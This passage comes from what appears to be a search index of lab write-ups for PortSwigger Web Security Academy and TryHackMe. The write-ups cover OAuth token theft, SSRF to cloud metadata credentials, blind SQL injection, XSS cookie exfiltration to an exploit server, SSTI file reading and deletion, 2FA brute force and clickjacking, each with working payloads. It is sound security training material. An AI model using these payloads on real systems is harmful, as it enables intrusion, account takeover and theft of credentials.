the path specified in a query parameter. Send the corresponding GET /post/next?path=[...] request to Repeater. 9. In Repeater, experiment with the path parameter. Notice that this is an open redirect. You can even supply an absolute URL to elicit a redirect to a completely different domain, for example, your exploit server. 10. Craft a malicious URL that combines these vulnerabilities. You need a URL that will initiate an OAuth flow with the redirect_uri pointing to the open redirect, which subsequently forwards the victim to the exploit server: https://oauth-0ae200a004f3f5dcc13e332b02eb00e3.oauth-server.net/auth?client_id=pqljknqzyjxcmx466g9ru&redirect_uri=https://0afd00940493f56bc11235de000a00cb.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a8200d604bff535c17a34810190009f.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email Test that this URL works correctly by visiting it in your browser. You should be redirected to the exploit server’s “Hello, world!” page, along with the access token in a URL fragment. https://exploit-0a8200d604bff535c17a34810190009f.exploit-server.net/exploit#access_token=nN8ZIvHilG4s7KBOdzYcCX67c_EOP-_6B_oqbkjEMZe&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email On the exploit server, create a suitable script at /exploit that will extract the fragment and output it somewhere. For example, the following script will leak it via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead: <script> window.location = '/?'+document.location.hash.substr(1) </script> To test that everything is working correctly, Store this exploit and visit the malicious URL again in your browser. Then, go to the exploit server access log. There should be a request for GET /?access_token=[...] . You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. For example: <script> if (!document.location.hash) { window.location = 'https://oauth-0ae200a004f3f5dcc13e332b02eb00e3.oauth-server.net/auth?client_id=pqljknqzyjxcmx466g9ru&redirect_uri=https://0afd00940493f56bc11235de000a00cb.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a8200d604bff535c17a34810190009f.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email' } else { window.location = '/?'+document.location.hash.substr(1) } </script> To test that the exploit works, store it and then click View exploit . The page should appear to refresh, but if you check the access log, you should see a new request for GET /?access_token=[...] . Deliver the exploit to the victim, then copy their access token from the log. 5x-Yiba4AKFqAooI7XQdZXBd2YgUtnFCg3SPODWJaT4 In Repeater, go to the GET /me request and replace the token in the Authorization: Bearer header with the one you just copied. Send the request. Observe that you have successfully made an API call to fetch the victim’s data, including their API key. Use the Submit solution button at the top of the lab page to submit the stolen key and solve the lab. Exploitability  An attacker will need to log in to wiener:peter ; and then identify an open redirect on the blog website; use this to steal an access token for the admin user’s account; use the access token to obtain the admin’s API key; and submit the solution using the button provided in the lab banner.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "555548d9feb179f451669087d1d6979f",
    "u": "https://webapp.tymyrddin.dev/docs/oauth/5",
    "t": "SSRF via OpenID dynamic client registration ",
    "c": "SSRF via OpenID dynamic client registration  Description  This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF. Reproduction and proof of concept  While proxying traffic through Burp, log in with wiener:peter . Browse to https://YOUR-LAB-OAUTH-SERVER.web-security-academy.net/.well-known/openid-configuration to access the configuration file. Notice that the client registration endpoint is located at /reg . https://oauth-0a6900b5048945d8c1ab1ffc02d8004e.oauth-server.net/.well-known/openid-configuration In Burp Repeater, create a suitable POST request to register your own client application with the OAuth service. You must at least provide a redirect_uris array containing an arbitrary whitelist of callback URIs for your fake application. For example: POST /reg HTTP/1.1 Host: oauth-0a6900b5048945d8c1ab1ffc02d8004e.oauth-server.net Content-Type: application/json { \"redirect_uris\" : [ \"https://example.com\" ] } Send the request. You have now successfully registered your own client application without requiring any authentication. The response contains various metadata associated with your new client application, including a new client_id . Using Burp, audit the OAuth flow and notice that the Authorize page, where the user consents to the requested permissions, displays the client application’s logo. This is fetched from /client/CLIENT-ID/logo . We know from the OpenID specification that client applications can provide the URL for their logo using the logo_uri property during dynamic registration. Send the GET /client/CLIENT-ID/logo request to Burp Repeater. From the Burp menu, open the Burp Collaborator client and click Copy to clipboard to copy a Collaborator URL. Leave the Collaborator dialog open for now. In Repeater, go back to the POST /reg request that you created earlier. Add the logo_uri property and paste your Collaborator URL as its value. The final request should look something like this: POST /reg HTTP/1.1 Host: oauth-0a6900b5048945d8c1ab1ffc02d8004e.oauth-server.net Content-Type: application/json { \"redirect_uris\" : [ \"https://example.com\" ], \"logo_uri\" : \"https://ayc1v2jr1ayrplf516zakprhe8kz8pwe.oastify.com\" } Send the request to register a new client application and copy the client_id from the response. \"client_id\":\"RnZsZfMVpfPS3fvIwXoY6\", In Repeater, go to the GET /client/CLIENT-ID/logo request. Replace the CLIENT-ID in the path with the new one you just copied and send the request. Go to the Burp Collaborator client dialog and check for any new interactions. There is an HTTP interaction attempting to fetch your non-existent logo. This confirms that you can successfully use the logo_uri property to elicit requests from the OAuth server. 10. Go back to the POST /reg request in Repeater and replace the current logo_uri value with the target URL: \"logo_uri\" : \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/\" Send this request and copy the new client_id from the response. \"client_id\":\"lswpWbRUl4rUzN4GYG8js\", Go back to the GET /client/CLIENT-ID/logo request and replace the client_id with the new one you just copied. Send this request. Observe that the response contains the sensitive metadata for the OAuth provider’s cloud environment, including the secret access key. Use the Submit solution button to submit the access key and solve the lab. Exploitability  An attacker will need to log in; and then craft an SSRF attack to access http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ and steal the secret access key for the OAuth provider’s cloud environment. Note: To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, use Burp Collaborator’s default public server.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "43a4c08e7713e71a9a808d0faadeea29",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/12",
    "t": "Blind SQL injection with conditional errors ",
    "c": "Blind SQL injection with conditional errors  Description  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie. The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message. The database contains a different table called users, with columns called username and password. Exploiting the blind SQL injection vulnerability the password of the administrator user can be found out. Reproduction and proof of concept  Visit the Home page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. The value of the cookie is TrackingId=fUlVewByGOv8LfSS . Confirm the TrackingId is a SQLi vulnerable parameter: Modify the TrackingId cookie, appending a single quotation mark to it: TrackingId=fUlVewByGOv8LfSS' . An error message is received. Now change it to two quotation marks: TrackingId=fUlVewByGOv8LfSS'' . The error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response. Confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error: Construct a subquery using valid SQL syntax: TrackingId=fUlVewByGOv8LfSS'||(SELECT '')||' The query appears to still be invalid. This may be due to the database type - try Oracle, by specifying a predictable table name in the query: TrackingId=fUlVewByGOv8LfSS'||(SELECT '' FROM dual)||' There is no error, indicating that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name. Crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, by querying a non-existent table name: TrackingId=fUlVewByGOv8LfSS'||(SELECT '' FROM not-a-real-table)||' An error is returned. This behaviour strongly suggests that your injection is being processed as a SQL query by the back-end. Note: As long as syntactically valid SQL queries are injected, error responses can be used to infer key information about the database. To verify that the users table exists, send the query: TrackingId=fUlVewByGOv8LfSS'||(SELECT '' FROM users WHERE ROWNUM = 1)||' As this query does not return an error, infer that this table does exist. Note that the WHERE ROWNUM = 1 condition is important to prevent the query from returning more than one row, which would break the concatenation. It is also possible exploit this behaviour to test conditions: TrackingId=fUlVewByGOv8LfSS'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' Verify that an error message is received. Then change it to: TrackingId=fUlVewByGOv8LfSS'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' The error disappears, demonstrating that it is possible to trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The first expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true. Note: It is possible to use this behaviour to test whether specific entries exist in a table. Use the following query to check whether the username administrator exists: TrackingId=fUlVewByGOv8LfSS'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' Verify that the condition is true (the error is received), confirming that there is a user called administrator. The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to: TrackingId=fUlVewByGOv8LfSS'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||' This condition should be true, confirming that the password is greater than 1 character in length. Send a series of follow-up values to test different password lengths. Send: TrackingId=fUlVewByGOv8LfSS'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' Then send: TrackingId=fUlVewByGOv8LfSS'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' And so on. Do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is 20 characters long. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests. Send the request to Burp Intruder, using the context menu. In the Positions tab of Burp Intruder, clear the default payload positions by clicking the “Clear §” button. In the Positions tab, change the value of the cookie to: TrackingId=fUlVewByGOv8LfSS'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' This uses the SUBSTR() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn. Place payload position markers around the final a character in the cookie value. To do this, select just the a , and click the “Add §” button: TrackingId=fUlVewByGOv8LfSS'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' To test the character at each position, you’ll need to send suitable payloads in the payload position that you’ve defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that “Simple list” is selected, and under “Payload Options” add the payloads in the range a-z and 0-9 . You can select these easily using the “Add from list” drop-down. Launch the attack by clicking the “Start attack” button or selecting “Start attack” from the Intruder menu. Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The “Status” column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position. Re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2 : TrackingId=fUlVewByGOv8LfSS'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' Launch the modified attack, review the results, and note the character at the second offset. Continue this process testing offset 3 , 4 , and so on, until the whole password is known. In the browser, click “My account” to open the login page. Use the password to log in as the administrator user.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "59efd49f01f722239130bfbaacd8e7d8",
    "u": "https://webapp.tymyrddin.dev/docs/id/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy Information disclosure Labs Introduction  What?  Information disclosure, also known as information leakage, is when a website unintentionally reveals sensitive information to its users. Depending on the context, websites may leak all kinds of information to a potential attacker, including: Data about other users, such as usernames or financial information, Sensitive commercial or business data, and technical details about the website and its infrastructure. Why?  The dangers of leaking sensitive user or business data are fairly obvious, but disclosing technical information can sometimes be just as serious. Although some of this information will be of limited use, it can potentially be a starting point for exposing an additional attack surface, which may contain other interesting vulnerabilities. The knowledge that you are able to gather could even provide the missing piece of the puzzle when trying to construct complex, high-severity attacks. Occasionally, sensitive information might be carelessly leaked to users who are simply browsing the website in a normal fashion. More commonly, however, an attacker needs to elicit the information disclosure by interacting with the website in unexpected or malicious ways. They will then carefully study the website’s responses to try and identify interesting behavior. How?  Information disclosure techniques Information disclosure in error messages Information disclosure on debug page Source code disclosure via backup files Authentication bypass via information disclosure Information disclosure in version control history",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e381df6dfb15e6965a32866a714f46a2",
    "u": "https://webapp.tymyrddin.dev/docs/auth/1",
    "t": "Username enumeration via different responses ",
    "c": "Username enumeration via different responses  Description  This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password . Reproduction and proof of concept  With Burp running, investigate the login page and submit an invalid username and password. In Burp, go to Proxy > HTTP history and find the POST /login request. Send this to Burp Intruder. In Burp Intruder, go to the Positions tab. Make sure that the Sniper attack type is selected. Click Clear § to remove any automatically assigned payload positions. Highlight the value of the username parameter and click Add § to set it as a payload position. This position will be indicated by two § symbols, for example: username=§invalid-username§ . Leave the password as any static value for now. On the Payloads tab, make sure that the Simple list payload type is selected. Under Payload options, paste the list of candidate usernames. Finally, click Start attack. The attack will start in a new window. When the attack is finished, on the Results tab, examine the Length column. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message Invalid username , but this response says Incorrect password . Make a note of the username in the Payload column. Close the attack and go back to the Positions tab. Click Clear, then change the username parameter to the username you just identified. Add a payload position to the password parameter. The result should look something like this: username=identified-user&password=§invalid-password§ On the Payloads tab, clear the list of usernames and replace it with the list of candidate passwords. Click Start attack. When the attack is finished, look at the Status column. Notice that each request received a response with a 200 status code except for one, which got a 302 response. This suggests that the login attempt was successful - make a note of the password in the Payload column. Log in using the username and password that you identified and access the user account page to solve the lab. Exploitability  An attacker will need to enumerate a valid username, brute-force this user’s password, then access their account page.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b896a452834652a89c345ed89649d205",
    "u": "https://webapp.tymyrddin.dev/docs/auth/10",
    "t": "Offline password cracking ",
    "c": "Offline password cracking  Description  This lab stores the user’s password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. Reproduction and proof of concept  With Burp running, use your own account to investigate the Stay logged in functionality. the stay-logged-in cookie is a Base64 encoded MD5 hash . In the Proxy -> HTTP history tab, go to the Response to your login request and highlight the stay-logged-in cookie, to see that it is constructed as follows: username + ':' + md5HashOfPassword You now need to steal the victim user’s cookie. Observe that the comment functionality is vulnerable to XSS with: <img src=1 onerror=alert(1) /> Go to the exploit server and make a note of the URL. Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID: < script > document . location = 'https://exploit-0ada00b603793ec2c37f6a5601690033.exploit-server.net/' + document . cookie </ script > On the exploit server, open the access log. There should be a GET request from the victim containing their stay-logged-in cookie. Decode the cookie in Burp Decoder. The result will be: Copy the hash and paste it into a search engine. This will reveal that the password is onceuponatime . Log in to the victim’s account, go to the My account page, and delete their account to solve the lab. Exploitability  An attacker will need to obtain Carlos’s stay-logged-in cookie and use it to crack his password;then log in as carlos and delete his account from the “My account” page.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "514583e848886272df30505d85a556be",
    "u": "https://webapp.tymyrddin.dev/docs/clickjacking/4",
    "t": "Exploiting clickjacking vulnerability to trigger DOM-based XSS ",
    "c": "Exploiting clickjacking vulnerability to trigger DOM-based XSS  Description  This lab contains an XSS vulnerability that is triggered by a click. Reproduction and proof of concept  Log in to the wiener account on the target website and find vuln. Create payload: The iframe src URL points to the target website vulnerable page. In this case, the /feedback page, and depends on the unique lab-id . An initial opacity of 0.1 to align the iframe actions and adjust the position values. Initial $top_value and $side_value values of resp 610px and 80px to align the “Submit feedback” button with the “Test me” decoy action. <style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; } div { position:absolute; top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div> <iframe src=\"lab-id.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult\"></iframe> Go to the exploit server and paste the payload into the body field of the form. Click Store and then View exploit . Hover over “Test me” to make sure the cursor changes to a hand indicating that the div element is positioned correctly. If it is not, adjust the position of the div element by modifying the top and left properties of the style sheet. Change “Test me” to “Click me”, set opacity to 0.0001 , and click Store . Deliver exploit to victim Exploitability  An attacker needs to construct a clickjacking attack that fools the user into clicking the “Click me” button to call the print() function.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "54dd93ede24d1e6b1d1d6795539cabff",
    "u": "https://webapp.tymyrddin.dev/docs/id/3",
    "t": "Source code disclosure via backup files ",
    "c": "Source code disclosure via backup files  Description  This lab leaks its source code via backup files in a hidden directory. Reproduction and proof of concept  Browse to /robots.txt . It reveals the existence of a /backup directory. Browse to /backup to find the file ProductTemplate.java.bak . Or right-click on the lab in the site map and go to Engagement tools -> Discover content and launch a content discovery session to discover the /backup directory and its contents. Browse to /backup/ProductTemplate.java.bak to access the source code. package data.productcatalog; import common.db.JdbcConnectionBuilder; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; import java.sql.Connection; import java.sql.ResultSet; import java.sql.SQLException; import java.sql.Statement; public class ProductTemplate implements Serializable { static final long serialVersionUID = 1L; private final String id; private transient Product product; public ProductTemplate(String id) { this.id = id; } private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException { inputStream.defaultReadObject(); ConnectionBuilder connectionBuilder = ConnectionBuilder.from( \"org.postgresql.Driver\", \"postgresql\", \"localhost\", 5432, \"postgres\", \"postgres\", \"v6c8ogbwkjt6wyzbb5uf64ykbc3oygam\" ).withAutoCommit(); try { Connection connect = connectionBuilder.connect(30); String sql = String.format(\"SELECT * FROM products WHERE id = '%s' LIMIT 1\", id); Statement statement = connect.createStatement(); ResultSet resultSet = statement.executeQuery(sql); if (!resultSet.next()) { return; } product = Product.from(resultSet); } catch (SQLException e) { throw new IOException(e); } } public String getId() { return id; } public Product getProduct() { return product; } } In the source code, the connection builder contains the hard-coded password for a Postgres database. Go back to the lab, click Submit solution , and enter the database password to solve the lab. Exploitability  An attacker will need to identify and submit the database password, which is hard-coded in the leaked source code.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5ae380e45d6b6c2fb2c7685f68182a3e",
    "u": "https://webapp.tymyrddin.dev/docs/thm/picklerick",
    "t": "Picklerick ",
    "c": "Picklerick  Attack tree  1 Enumerate 1.1 Gobuster 1.2 Dirbuster 2 Puzzling for clues Example  This example is from doing the THM Pickle Rick room : We need to find the three secret ingredients in order to turn Rick back to his old self. One  Enumerate the machine by using Nmap scanner. nmap -Pn -sV -A <Machine IP> -vv Two ports are open on the machine: 80 (HTTP) and 22 (SSH). Try view the site on Machine IP and the source code for more information. Owww, a note to self with a username: R1ckRul3s . Using gobuster to enumerate: gobuster dir -u <Machine IP> -w /usr/share/dirb/wordlists/common.txt Visiting many places and files. The Machine IP/robots.txt file inside the web server contains Wubbalubbadubdub . Could be a password. Or just nonsense. Enumerating the web server using dirbuster gives a portal.php gobuster did not list. Visiting the portal site brings a login page. Trying the found username R1ckRul3s and Wubbalubbadubdub as password gives a command panel page with a form. Perhaps an RCE is possible? Doing an ls shows the first secret ingredient file and a clue.txt , BUT, cat is disabled. So try less instead. Boom! Two  And the clue.txt file indicates there is another ingredient file hidden inside the file system. ls -la /home/rick less '/home/rick/second ingredients' Ha! Three  sudo- l results: (ALL) NOPASSWD: ALL No password on sudo, sooo: sudo ls -la /root sudo less '/root/3rd.txt' Found.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9c6ad03daa63d23246571f898dab94f2",
    "u": "https://webapp.tymyrddin.dev/docs/dom/6",
    "t": "Exploiting DOM clobbering to enable XSS ",
    "c": "Exploiting DOM clobbering to enable XSS  Description  This lab contains a DOM-clobbering vulnerability. The comment functionality allows “safe” HTML. Reproduction and proof of concept  Analysis: The site uses the DOMPurify filter in an attempt to reduce DOM-based vulnerabilities. DOMPurify allows for the use of the cid: protocol, which does not URL-encode double-quotes. This means an encoded double-quote can be injected that will be decoded at runtime. As a result, an injection can cause the defaultAvatar variable to be assigned the clobbered property {avatar: ‘cid:\"onerror=alert(1)//’} the next time the page is loaded. The defaultAvatar object is implemented using this dangerous pattern containing the logical OR operator in conjunction with a global variable. This makes it vulnerable to DOM clobbering . This object can be clobbered using anchor tags. Creating two anchors with the same ID causes them to be grouped in a DOM collection. The name attribute in the second anchor contains the value avatar , which will clobber the avatar property with the contents of the href attribute. Go to one of the blog posts and create a comment containing the following anchors: <a id=defaultAvatar><a id=defaultAvatar name=avatar href=\"cid:&quot;onerror=alert(1)//\"> Return to the blog post and create a second comment containing any random text. The next time the page loads, the alert() is called. The page for a specific blog post imports the JavaScript file loadCommentsWithDomPurify.js , which contains the following code: let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'} When you make a second post, the browser uses the newly-clobbered global variable, which smuggles the payload in the onerror event handler and triggers the alert() . Exploitability  To solve this lab, an attacker will need to construct an HTML injection that clobbers a variable and uses XSS to call the alert() function.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "338dcfc3093aa8633b7746b4c60a4dbb",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/2",
    "t": "SQL injection vulnerability allowing login bypass ",
    "c": "SQL injection vulnerability allowing login bypass  Description  This lab contains an SQL injection vulnerability in the login function. Reproduction and proof of concept  SQL: SELECT * FROM users WHERE username = 'administrator' AND password = '' OR 1=1 -- Use Burp Suite to intercept and modify the login request. Modify the username parameter, giving it the value: administrator'-- Or modify it in the URL: Exploitability  An attacker needs to perform an SQL injection attack that logs in to the application as the administrator user.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b25294ef025b3fde2eb353da76673d38",
    "u": "https://webapp.tymyrddin.dev/docs/auth/14",
    "t": "2FA bypass using a brute-force attack ",
    "c": "2FA bypass using a brute-force attack  Description  This lab ’s two-factor authentication is vulnerable to brute-forcing. Reproduction and proof of concept  With Burp running, log in as carlos and investigate the 2FA verification process. Notice that if you enter the wrong code twice, you will be logged out again. You need to use Burp’s session handling features to log back in automatically before sending each request. In Burp, go to Settings -> Sessions . In the Session Handling Rules panel, click Add . The Session handling rule editor dialog opens. In the dialog, go to the Scope tab. Under URL Scope, select the option Include all URLs . Go back to the Details tab and under Rule Actions , click Add -> Run a macro . Under Select macro click Add to open the Macro Recorder. Select the following 3 requests: GET /login POST /login GET /login2 Then click OK. The Macro Editor dialog opens. Click Test macro and check that the final response contains the page asking you to provide the 4-digit security code. This confirms that the macro is working correctly. Keep clicking OK to close the various dialogs until you get back to the main Burp window. The macro will now automatically log you back in as Carlos before each request is sent by Burp Intruder. Send the POST /login2 request to Burp Intruder. In Burp Intruder, add a payload position to the mfa-code parameter. On the Payloads tab, select the Numbers payload type. Enter the range 0 - 9999 and set the step to 1 . Set the min/max integer digits to 4 and max fraction digits to 0 . This will create a payload for every possible 4-digit integer. Go to the Resource pool tab and add the attack to a resource pool with the Maximum concurrent requests set to 1 . Start the attack. Eventually, one of the requests will return a 302 status code. Right-click on this request and select Show response in browser. Copy the URL and load it in the browser. Click My account to solve the lab. Exploitability  An attacker has already obtained a valid username and password ( carlos:montoya ), but does not have access to the user’s 2FA verification code. The attacker will need to brute-force the 2FA code and access carlos ’s account page.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d86175b2ac803a04f20ca50489e129d3",
    "u": "https://webapp.tymyrddin.dev/docs/pollution/7",
    "t": "Detecting server-side prototype pollution without polluted property reflection ",
    "c": "Detecting server-side prototype pollution without polluted property reflection  This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. Reproduction and PoCs  Study the address change feature  Log in and visit your account page. Submit the form for updating your billing and delivery address. In Burp, go to the Proxy -> HTTP history tab and find the POST /my-account/change-address request. When submitting the form, the data from the fields is sent to the server as JSON. The server responds with a JSON object that appears to represent your user. This has been updated to reflect the new address information. Send the request to Burp Repeater. In Repeater, add a new property to the JSON with the name __proto__ , containing an object with an arbitrary property: \"__proto__\": { \"foo\":\"bar\" } Send the request. The object in the response does not reflect the injected property. However, this doesn’t necessarily mean that the application isn’t vulnerable to prototype pollution. Identify a prototype pollution source  In the request, modify the JSON in a way that intentionally breaks the syntax. For example, delete a comma from the end of one of the lines. Send the request. Observe that you receive an error response in which the body contains a JSON error object. Although a 500 error response is received, the error object contains a status property with the value 400 . In the request, make the following changes: Fix the JSON syntax by reversing the changes that triggered the error. Modify the injected property to try polluting the prototype with your own distinct status property. Remember that this must be between 400 and 599 . \"__proto__\": { \"status\":555 } Send the request. The normal response containing the user object is received. Intentionally break the JSON syntax again and reissue the request. The same error is triggered, but the status and statusCode properties in the JSON response match the arbitrary error code that was injected into Object.prototype . This strongly suggests that the prototype is polluted and the lab is solved. Exploitability  An attacker will need to identify and confirm the vulnerability by polluting Object.prototype in a way that triggers a noticeable but non-destructive change in the server’s behaviour. As this lab is designed to practice non-destructive detection techniques, do not progress to exploitation. When testing for server-side prototype pollution, it’s possible to break application functionality or even bring down the server completely. If this happens to the lab, restart the server manually using the button provided in the lab banner. You are unlikely to have this option when testing real websites, so always use caution.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "33a48d49f5eb885f4bc1394dccc78404",
    "u": "https://webapp.tymyrddin.dev/docs/ssti/7",
    "t": "Server-side template injection with a custom exploit ",
    "c": "Server-side template injection with a custom exploit  Description  This lab is vulnerable to server-side template injection. Reproduction and proof of concept  While proxying traffic through Burp, log in with wiener:peter and post a comment on one of the blogs. Go to the “My account” page. Notice that the functionality for setting a preferred name is vulnerable to server-side template injection, and that you have access to the user object. POST /my-account/change-blog-post-author-display HTTP/1.1 Host: 0aa10086032826fac0fb869a007b007d.web-security-academy.net Cookie: session=weVRd6xjRJcAO1mP22aj4F8fT9rTzBAf User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 78 Origin: https://0aa10086032826fac0fb869a007b007d.web-security-academy.net Referer: https://0aa10086032826fac0fb869a007b007d.web-security-academy.net/my-account?id=wiener Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Te: trailers Connection: close blog-post-author-display=user.first_name&csrf=TmMgLY1pTzScQv6xgJGRNiWHptf3lzdf Investigate the custom avatar functionality. Notice that when you upload an invalid image, the error message discloses a method called user.setAvatar() . Also take note of the file path /home/carlos/User.php . You will need this later. Request : POST /my-account/avatar HTTP/1.1 Host: 0aa10086032826fac0fb869a007b007d.web-security-academy.net Cookie: session=weVRd6xjRJcAO1mP22aj4F8fT9rTzBAf User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------161787197129286381834010908465 Content-Length: 493 Origin: https://0aa10086032826fac0fb869a007b007d.web-security-academy.net Referer: https://0aa10086032826fac0fb869a007b007d.web-security-academy.net/my-account?id=wiener Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Te: trailers Connection: close -----------------------------161787197129286381834010908465 Content-Disposition: form-data; name=\"avatar\"; filename=\"nonsense.txt\" Content-Type: text/plain nonsense -----------------------------161787197129286381834010908465 Content-Disposition: form-data; name=\"user\" wiener -----------------------------161787197129286381834010908465 Content-Disposition: form-data; name=\"csrf\" TmMgLY1pTzScQv6xgJGRNiWHptf3lzdf -----------------------------161787197129286381834010908465-- Response HTTP/1.1 500 Internal Server Error Content-type: text/html; charset=UTF-8 Connection: close Content-Length: 290 <pre>PHP Fatal error: Uncaught Exception: Uploaded file mime type is not an image: text/plain in /home/carlos/User.php:28 Stack trace: #0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/nonsense.t...', 'text/plain') #1 {main} thrown in /home/carlos/User.php on line 28 </pre> Upload a valid image as your avatar and load the page containing your test comment. In Burp Repeater, open the POST request for changing your preferred name and use the blog-post-author-display parameter to set an arbitrary file as your avatar: user.setAvatar(\"/etc/passwd\") Load the page containing your test comment to render the template. Internal Server Error PHP Fatal error: Uncaught ArgumentCountError: Too few arguments to function User::setAvatar(), 1 passed in /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Extension/Core.php on line 1601 and exactly 2 expected in /home/carlos/User.php:26 Stack trace: ... Notice that the error message indicates that you need to provide an image MIME type as the second argument. Provide this argument and view the comment again to refresh the template: user.setAvatar('/etc/passwd','image/jpeg') To read the file, load the avatar using GET /avatar?avatar=wiener . This will return the contents of the /etc/passwd file, confirming that you have access to arbitrary files. Repeat this process to read the PHP file that you noted down earlier: user.setAvatar('/home/carlos/User.php','image/jpeg') Reload the blog post with the comment and load the avatar using GET /avatar?avatar=wiener again. In the PHP file, Notice that you have access to the gdprDelete() function, which deletes the user’s avatar. You can combine this knowledge to delete Carlos’s file. First set the target file as your avatar, then view the comment to execute the template: user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg') Invoke the user.gdprDelete() method and view your comment again to solve the lab. blog-post-author-display=user.gdprDelete()&csrf=TmMgLY1pTzScQv6xgJGRNiWHptf3lzdf Exploitability  An attacker will need to create a custom exploit to delete the file /.ssh/id_rsa from Carlos’s home directory.",
